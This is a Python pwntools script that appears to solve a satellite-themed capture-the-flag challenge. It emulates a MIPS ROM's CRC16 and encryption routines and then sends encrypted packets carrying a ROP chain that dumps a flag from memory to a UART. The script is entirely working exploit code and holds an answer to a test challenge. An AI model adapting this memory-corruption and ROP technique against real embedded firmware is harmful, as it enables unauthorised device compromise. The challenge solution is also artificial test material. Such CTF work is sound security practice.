from pwn import *

from sphynx import Sphynx, Panda

context.arch = 'mips'
context.bits = 32
context.os = 'baremetal'

sphynx = Sphynx()
dragon = sphynx.add_dragon("challenge.rom", "/home/user/ctf/hackasat/.g", "bins")
lion = sphynx.add_lion(panda='panda.py')
gdb = lion.gdb
# sphynx.add_eagle('challenge.rom', main_opts={'backend':'blob', 'arch':'mipsel','base_addr':0xbfc00000,'entry_point':0xbfc00400})

class debug_prints(gdb.Breakpoint):
    def stop(self): 
        lion.wm(0xa0180050, b'\x07')
# debug_prints('*0xbfc08e14', temporary=True)

class init_crypt(gdb.Breakpoint):
    def stop(self): 
        print(lion.rm(lion.rr('a0'),0x80))
# init_crypt('*0xbfc00ac0', temporary=True)


lion.console.recvuntil(b'listening\n')
io = remote('localhost', 12345)


emu = dragon.emu()
def crc16(data):
    emu.writeMemory(dragon.toAddr(0), data)
    dragon.call(emu, 0xbfc083b0, 0, 0, len(data))
    return p16(emu.readRegister('v0').longValue())

emu.writeMemory(dragon.toAddr(0x1000), b'\x04\x10\x10\xa0$\x0f\x11\xa0;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbd\x01\x00\x00\xc8\xbe\xbc\xa6\x90\x96\xc9\xac\xaf\x12G]\xba\xb6w+\x00\x00\x00\x00Yc8X5\x87\x9amA\x0c0Z\xe4\xbf@\xed\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\xd8\xff\x0f\xa0\xc4\xff\x0f\xa0\x9c\xff\x0f\xa0\xb0\xff\x0f\xa0\x88\xff\x0f\xa0\xc4\xff\x0f\xa0\xb0\xff\x0f\xa0')
def encrypt(data):
    emu.writeMemory(dragon.toAddr(0), data)
    # call decrypt not encrypt, they are almost symmetrical but use c2/c3
    dragon.call(emu, 0xbfc00ac0, 0x1000, 0, len(data))
    return bytes(emu.readMemory(dragon.toAddr(0), len(data)))


def mk_pkt(type, data, sz=0xc0):
    data = data.ljust(sz-3)
    return bytes([type])+crc16(data)+data


io.send(mk_pkt(0x79, unhex('c0'), 0x20)) # increase msg size

io.send(mk_pkt(0xe3, unhex('1770'), 0xc0)) # key exchange - grab crypt from init_crypt bp

io.recvn(0xc0).hex()


FLAG = 0xa2008000
WRITEABLE = FLAG+0x800
UART = 0xa00fecfc
MOV_A2_S1_20 = 0xbfc08000 
MOV_A1_A2_18 = 0xbfc08060
MOV_A0_S0_28 = 0xbfc08390
cl = 0xc0-3-1-2
blob = fit(
{
    0x6d616177: WRITEABLE,
    0x6e616167: MOV_A2_S1_20,
    0x6d616178: FLAG,

    0x6e61616f: MOV_A1_A2_18,

    0x6e61616d: WRITEABLE,
    0x6e616175: MOV_A2_S1_20,
    0x6e61616e: 0x100,

    0x6f616164: MOV_A0_S0_28,
    0x6f616162: UART,

    0x6f61616e: 0xbfc0816c,

    0x6f616178: 0xbfc00180,

},
length=16*cl)

with log.progress('Sending packets'):
    for i in range(16):
        enc = encrypt(p16(i)+blob[cl*i:cl*(i+1)])
        io.send(mk_pkt(0xe3,unhex('73')+enc))



enc = encrypt(p16(0x8000)+blob[:cl])
io.send(mk_pkt(0xe3,unhex('73')+enc))

log.success(io.recvn(0x100).strip(b'\x00').decode())
